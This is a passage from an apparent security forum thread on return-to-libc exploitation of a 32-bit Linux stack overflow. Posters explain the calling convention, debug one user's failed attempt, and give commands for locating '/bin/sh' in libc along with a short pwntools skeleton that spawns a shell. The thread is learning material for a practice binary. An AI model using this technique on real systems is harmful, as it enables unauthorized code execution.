                  | "AAAAAAAAAAAAAAAAAA" |
                  |         ....         |
                  |         ....         |
                  +----------------------+
                  
</code></pre>
<p>It’s the same as a buffer/stack overflow but with a twist. Since you can’t return to the stack because it’s not executable, you have to return somewhere else. Libc in that case could be pretty handy.</p>
<p><a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> wanted to call system(). So all he had to do is “simulate” the function calling convention behaviour and jump to system()'s code. Because the binary is 32-bit the function prologue in our case would be the following:</p>
<ul>
<li>Push the return address on the stack.</li>
<li>Push the function’s arguments.</li>
<li>Jump to system()'s code.</li>
</ul>
<p>When we have a case of a classic stack overflow, you overflow the stack and overwrite the pushed return address with the one of your shellcode’s. Once gets() is done it’ll jump to wherever the pushed return address is pointing to. But, there is no shellcode this time, there is system(). And in order to call system() you have to follow the above convention in order to look legit.</p>
<p>By the way, now that I look at <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a>’s perl command, I think the order should be different(?). I might be wrong though.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="9" />
<span class="post-likes">9 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="3" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-02T12:50:10Z" class="post-time">
April 2, 2017, 12:50pm
</time>
<meta itemprop="dateModified" content="2017-04-02T12:50:10Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yes I fixed it, should be 260 a’s <img src="../../images/emoji/twitter/sweat_smile.png%3Fv=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-02T19:58:25Z" class="post-time">
April 2, 2017, 7:58pm
</time>
<meta itemprop="dateModified" content="2017-04-02T19:58:25Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Much better explanation <a class="mention" href="https://0x00sec.org/u/_py">@_py</a>, thank you. You clear up things a lot.</p>
<p><a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> you should quote py’s response in your post.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/WhiteCollar"><span itemprop="name">WhiteCollar</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-10T03:04:34Z" class="post-time">
December 10, 2017, 3:04am
</time>
<meta itemprop="dateModified" content="2017-12-10T03:04:34Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I was following this example with the latest version of debian just out of interest. I have made sure that program returns into system() and the stack frame for system is:</p>
<p>[address of exit()] -&gt; Ret address<br>
[address of buffer] -&gt; Argument</p>
<p>but I am not getting a shell instead the program is just printing out “/bin/sh” on the console. Any tips?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-10T06:31:03Z" class="post-time">
December 10, 2017, 6:31am
</time>
<meta itemprop="dateModified" content="2017-12-10T06:40:11Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi mate, PoC | GTFO <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Translation just in case: Show us your exploit and the given binary.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/direnjie"><span itemprop="name">direnjie</span></a>
(direnjie)
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T05:24:19Z" class="post-time">
December 11, 2017, 5:24am
</time>
<meta itemprop="dateModified" content="2017-12-11T05:24:19Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>good article,thanks share</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/WhiteCollar"><span itemprop="name">WhiteCollar</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/f/fc6835123f3125db313f3734566b5aa004ba37db.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T10:31:37Z" class="post-time">
December 11, 2017, 10:31am
</time>
<meta itemprop="dateModified" content="2017-12-11T10:31:37Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>All right, I’ve taken a few screenshots because I think a picture tells a thousand words.</p>
<p>Binary Used (same as example):<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fc6835123f3125db313f3734566b5aa004ba37db.png" width="690" height="388"></p>
<p>Breakpoints set in GDB:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3401a5bf92ded0fc368245001662d5ccba3d9689.png" width="690" height="388"></p>
<p>Stack just before RET statement in main():<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/78f8ba00c965b52ea82457db09a66884844fc10f.png" width="690" height="388"></p>
<p>Contents of buffer:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d6087eb10f95405f6642d59f9e1a4bd71792dd72.png" width="690" height="388"></p>
<p>Exploit used:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8b041b132c945213342436854bc45ac40411c803.png" width="690" height="388"></p>
<p>Honestly man I’ve been trying to get a shell for days. I’ve gotten close with an error like sh: 1 error or something.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T11:00:55Z" class="post-time">
December 11, 2017, 11:00am
</time>
<meta itemprop="dateModified" content="2017-12-11T11:00:55Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>First of all, it’s 2017, let me introduce you to <a href="https://github.com/Gallopsled/pwntools" rel="nofollow noopener">pwntools</a>! There is no need to hardcode your exploit in an one-liner.</p>
<p>I’m away currently, but from a really quick look it looks like once you overflow the buffer up until the return address, you’ve entered system’s address, which is correct and then you place sh’s address on top of it, which is wrong. Then you place <code>0xffffd144</code> (no idea what that address is, but it’s definitely not a <code>/bin/sh</code> address), which is where sh’s address <strong>should</strong> be placed.</p>
<p>Since you’re trying to call <code>system("/bin/sh")</code>, according to Linux’s 32-bit calling convention, you should have placed <code>system + retaddr + sh</code>. <code>retaddr</code> is irrelevant since system won’t return. You are indeed calling <code>system</code>, but with the wrong argument, that’s why you’re getting an sh error. You’re calling <code>system(0xffffd144)</code>.</p>
<p>Make sure you scroll up in the comment section where I briefly describe how ret2libc works on x86 Linux.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/WhiteCollar"><span itemprop="name">WhiteCollar</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T11:09:09Z" class="post-time">
December 11, 2017, 11:09am
</time>
<meta itemprop="dateModified" content="2017-12-11T11:09:09Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>0xffffd144 is pointer to “/bin/sh” if you look at my second last image.<br>
0xf7e2e7f0 is the address of exit() which is the function I want to return to after system() but like you said its irrelevant.</p>
<p>Wait do I pass a pointer to “/bin/sh” or the actual “/bin/sh”?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T11:11:04Z" class="post-time">
December 11, 2017, 11:11am
</time>
<meta itemprop="dateModified" content="2017-12-11T11:11:04Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="WhiteCollar" data-post="17" data-topic="1833">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../letter_avatar_proxy/v4/letter/w/b38774/40.png" class="avatar"> WhiteCollar:</div>
<blockquote>
<p>Wait do I pass a pointer to “/bin/sh” or the actual “/bin/sh”?</p>
</blockquote>
</aside>
<p>a pointer to where /bin/sh actually is. not the string itself.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/WhiteCollar"><span itemprop="name">WhiteCollar</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T11:12:25Z" class="post-time">
December 11, 2017, 11:12am
</time>
<meta itemprop="dateModified" content="2017-12-11T11:12:25Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p>In regards to _py’s answer, shouldn’t system(0xffffd144) work then since 0xffffd144 is a pointer to “/bin/sh”?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T11:13:48Z" class="post-time">
December 11, 2017, 11:13am
</time>
<meta itemprop="dateModified" content="2017-12-11T11:28:10Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You should pass the pointer to <code>/bin/sh</code>. How are you calculating sh’s address on the stack? If you’re using gdb to find that out, then that’s your mistake. The stack alignment/padding inside and outside of gdb is different (environment variables etc). That being said, you can either use pwntools as I said in order to attach to the process and calculate the address properly, or do it the <strong>proper</strong> way which is via libc, which is why <code>0xffffd144</code> didn’t look like libc to me. You can find <code>/bin/sh</code> in libc actually. Since ASLR is off, you can do the following to calculate its offset.</p>
<pre><code class="lang-makefile">&gt;&gt; ldd binary   
      ....                                       
     libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e0e000)
      ...
&gt;&gt; strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 18cd17 /bin/sh
</code></pre>
<p>Meaning, <code>/bin/sh</code> is at <strong>libc_base + 0x18cd17</strong> (on my system, that is). If you want to find libc’s base address, hop in gdb and type <code>vmmap libc</code>.</p>
<p>Here’s a quick n’ dirty pwntools script:</p>
<pre><code class="lang-python">from pwn import *

p = process('./binary')
pause()

# padding 
payload  = "..." 			
payload += p32(system)
payload += p32(0x41414141)
payload += p32(sh)

p.sendline(payload) 

p.interactive()
</code></pre>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="1833%3Fpage=2.html">next page →</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
